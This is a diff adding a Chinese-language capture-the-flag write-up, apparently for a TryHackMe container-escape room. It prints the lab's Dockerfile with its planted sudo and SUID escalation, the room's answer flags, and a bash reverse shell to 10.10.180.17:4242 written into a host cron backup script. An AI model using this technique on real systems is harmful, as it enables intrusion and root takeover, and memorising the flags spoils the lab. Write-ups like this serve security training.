@@ -188,3 +188,61 @@ flag3 into /root dictory
 
 - [x] FLAG4
 
+在/目錄底下，我發現隱藏目錄.dockerenv，所以目前應該是container環境
+![image](https://user-images.githubusercontent.com/67756786/195786709-0f4a8036-b4a2-41a2-9ecd-619922b00f87.png)
+
+接著在opt中發現bakcup目錄
+![image](https://user-images.githubusercontent.com/67756786/195787001-f3465ed3-1557-4bfb-87b6-bd20aecaba10.png)
+
+backup.sh內容為`tar cf /root/container/backup/backup.tar /root/container`
+
+backup.tar解壓縮後有root/container/目錄，底下有Dockerfile、backup.sh、launch.sh
+Dockerfile
+```docker
+FROM php:apache-buster
+
+# Setup document root
+RUN mkdir -p /var/www/html
+
+# Make the document root a volume
+VOLUME /var/www/html
+
+# Add application
+WORKDIR /var/www/html
+COPY --chown=www-data src/ /var/www/html/
+
+RUN rm /var/log/apache2/*.log
+
+# Set up escalation
+RUN chmod +s `which env`
+RUN apt-get update && apt-get install sudo -y
+RUN echo "www-data ALL = NOPASSWD: `which env`" >> /etc/sudoers
+
+# Write flag
+RUN echo "THM{D1ff3r3nt_3nv1ronments_874112}" > /root/flag3.txt
+RUN chmod 400 /root/flag3.txt
+
+RUN echo "THM{LF1_t0_RC3_aec3fb}" > /var/www/flag2_QMW7JvaY2LvK.txt
+
+EXPOSE 80
+
+# Configure a healthcheck to validate that everything is up&running
+HEALTHCHECK --timeout=10s CMD curl --silent --fail http://127.0.0.1:80/
+```
+launch.sh
+```
+#!/bin/bash
+docker run -d -p 80:80 -v /root/container/backup:/opt/backups --rm box
+```
+接著更改backup.sh
+```
+echo "echo "#!/bin/bash \n bash -i >& /dev/tcp/10.10.180.17/4242 0>&1" > backup.sh"
+```
+監聽4242 port後會發現取得shell，並且為root權限，查看flag4.txt
+![image](https://user-images.githubusercontent.com/67756786/195788139-a9d0dad3-3a25-45a8-8eab-423e0686af69.png)
+
+確認crontab
+```
+corntab -l
+```
+![image](https://user-images.githubusercontent.com/67756786/195788238-83b05236-ba54-4743-87e0-b6f9447a552f.png)
